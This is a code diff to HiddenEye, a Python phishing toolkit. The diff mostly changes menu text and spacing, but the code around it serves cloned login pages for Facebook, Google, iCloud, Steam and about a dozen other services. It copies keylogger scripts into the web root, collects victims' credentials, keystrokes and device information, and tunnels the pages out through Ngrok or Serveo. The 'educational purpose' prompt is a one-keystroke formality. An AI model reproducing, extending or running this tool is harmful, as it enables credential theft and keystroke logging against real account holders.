@@ -55,7 +55,7 @@ def end(): #Message when HiddenEye exit
     WAITING FOR YOUR CONTRIBUTION. GOOD BYE ! {1}'''.format(RED, DEFAULT, CYAN))
 
 def loadModule(module):
-       print ('''{0}[{1}*{0}]{1} %s Modules Are Loading. You Have to Wait a few seconds...{0}'''.format(CYAN, DEFAULT) % module)
+       print ('''{0}[{1}*{0}]{1} %s Loading module..{0}'''.format(CYAN, DEFAULT) % module)
 
 def runPhishing(page, option2): #Phishing pages selection menu
     system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
@@ -123,7 +123,7 @@ def log(ctx): #Writing log
 def waitCreds():
     print("{0}[{1}*{0}]{1} Looks Like Everything is Ready. Now Feel The Power.".format(CYAN, DEFAULT))
     print("{0}[{1}*{0}]{1} KEEP EYE ON HIDDEN WORLD WITH DARKSEC.".format(RED, DEFAULT))
-    print(" {0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n".format(CYAN, DEFAULT))
+    print("{0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n".format(CYAN, DEFAULT))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
@@ -174,37 +174,44 @@ def waitCreds():
 
 def runPEnv(): #menu where user select what they wanna use
     system('clear')
-    print ('''------>{2} HIDDEN EYE {2}<-------
- _________________________________________________________________________________
+    print ('''
+  _________________________________________________________________________________  
+            ------>{2} HIDDEN EYE {2}<-------
+         {0}KEEP EYE ON HIDDEN WORLD WITH DARKSEC.
+ 
           {0}[ LIVE VICTIM  ATTACK INFORMATION ]
           {0}[ LIVE KEYSTROKES CAN BE CAPTURED ]
  _________________________________________________________________________________
                              {1}'''.format(GREEN, DEFAULT, CYAN))
-
-    for i in range(101):
-        sleep(0.01)
-        stdout.write("\r{0}[{1}*{0}]{1} Eye is Opening. Please Wait... %d%%".format(CYAN, DEFAULT) % i)
-        stdout.flush()
-
-    print ("\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, DEFAULT))
+    
+    
     if 256 != system('which php'): #Checking if user have PHP
-        print (" --{0}>{1} OK.".format(CYAN, DEFAULT))
+        print (" PHP INSTALLATION FOUND".format(CYAN, DEFAULT))
+       
     else:
         print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run HiddenEye again.http://www.php.net/".format(RED, DEFAULT))
         exit(0)
-    if input(" {0}[{1}!{0}]{1} DO YOU AGREE TO USE THIS TOOL FOR EDUCATIONAL PURPOSE ?  (y/n)\n {2}[HIDDENEYE-DARKSEC]- > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
+        
+    for i in range(101):
+        sleep(0.05)
+        stdout.write("\r{0}[{1}*{0}]{1} Eye is Opening. Please Wait... %d%%".format(CYAN, DEFAULT) % i)
+        stdout.flush() 
+        
+        
+           
+    if input(" \n\n{0}[{1}!{0}]{1} DO YOU AGREE TO USE THIS TOOL FOR EDUCATIONAL PURPOSE ?  (y/n)\n\n{2}[HIDDENEYE-DARKSEC]- > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
-        print ('\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n'.format(RED, DEFAULT))
+        print ('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n'.format(RED, DEFAULT))
         exit(0)    
    
-    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With   An0nUD4Y !\n\n {0}[HIDDENEYE-DARKSEC]- >  {1}".format(CYAN, DEFAULT))
+    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}[HIDDENEYE-DARKSEC]- >  {1}".format(CYAN, DEFAULT))
     if option == '1':
         loadModule('Facebook')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
@@ -228,7 +235,7 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('Instagram', option2)
     elif option == '9':
         loadModule('Snapchat')
@@ -252,15 +259,18 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Steam', option2)
     elif option == '14':
         loadModule('VK')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('VK', option2)
     elif option == '15':
         loadModule('iCloud')
         option2 = ''
         runPhishing('iCloud', option2)
     else:
-        exit(0)
-
+        
+        system('clear && ./HiddenEye.py')
+    
+         
+    
 
 
 def runServeo():
@@ -297,7 +307,7 @@ if __name__ == "__main__":
         runPEnv()
         def custom(): #Question where user can input custom web-link
             print("\n {0}Insert a custom redirect url:".format(CYAN, DEFAULT))
-            custom = input("\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+            custom = input("\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
             if 'http://' or 'https://' in custom:
                 pass
             else:
@@ -326,7 +336,7 @@ if __name__ == "__main__":
         def server(): #Question where user must select server
                 print("\n {0}Please select any available server:{1}".format(CYAN, DEFAULT))
                 print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, DEFAULT))
-                choice = input(" \n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
+                choice = input(" \n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
                 if choice == '1':
                     runNgrok()
                 elif choice == '2':
